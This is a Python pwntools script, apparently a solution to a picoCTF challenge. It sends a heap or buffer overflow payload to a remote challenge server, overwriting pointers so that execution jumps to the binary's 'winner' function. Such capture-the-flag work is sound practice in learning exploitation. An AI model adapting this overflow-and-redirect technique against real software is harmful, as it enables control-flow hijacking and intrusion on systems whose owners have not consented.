from typing import Callable
import subprocess

from pwn import *

context.arch = "i386"
context.terminal = ["tmux", "splitw", "-h"]
context.log_level = "debug"

vuln = ELF("./vuln")
WINNER = vuln.symbols["winner"]
PUTS = 0x0804C028


def payload() -> bytes:
    name1 = b""
    name1 += cyclic(8)
    name1 += p32(0x0804C038)  # 適当なアドレス
    name1 += p32(0x0804C038)  # 適当なアドレス
    name1 += p32(0x0804C038)  # 適当なアドレス
    name1 += p32(0x0804C038)  # 適当なアドレス
    name1 += p32(WINNER)
    # name1 += p32(0)
    # name1 += p32(PUTS)

    name2 = b""
    name2 += cyclic(4)

    data = b""
    data += name1
    data += b" "
    data += name2
    data += b"\n"

    return data


def solve(fact: Callable[[], tube]) -> None:
    p = fact()
    p.recvuntil(b"Enter two names separated by space:\n")
    p.send(payload())
    p.recvuntil(b"Enter two names separated by space:\n")

    p.recvall()
    p.close()


def main() -> None:
    # gdb.attach(p, gdbscript="display /4i $pc\ncontinue\n")
    # p = lambda: process(["./vuln"])
    p = lambda: remote("foggy-cliff.picoctf.net", 57786)
    solve(p)

    # cmd = ["qemu-i386", "-g", "1234", "./vuln", *payload().split(b" ")]
    # print(cmd)
    # subprocess.run(cmd)


if __name__ == "__main__":
    main()
